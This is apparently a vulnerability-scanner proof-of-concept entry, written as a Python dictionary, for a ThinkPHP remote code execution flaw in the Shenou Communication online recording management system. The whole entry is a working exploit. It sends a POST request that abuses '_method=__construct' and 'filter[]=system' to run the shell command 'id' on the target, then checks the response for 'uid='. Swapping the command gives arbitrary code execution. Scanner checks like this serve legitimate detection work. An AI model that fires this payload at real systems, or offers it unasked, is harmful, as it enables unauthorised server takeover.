{
        'name': '申瓯通信 在线录音管理系统 Thinkphp 远程代码执行漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/callcenter/public/index.php/index.php?s=index/index/index',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': """s=id&_method=__construct&method=POST&filter[]=system""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': 'uid='
        }}]
    }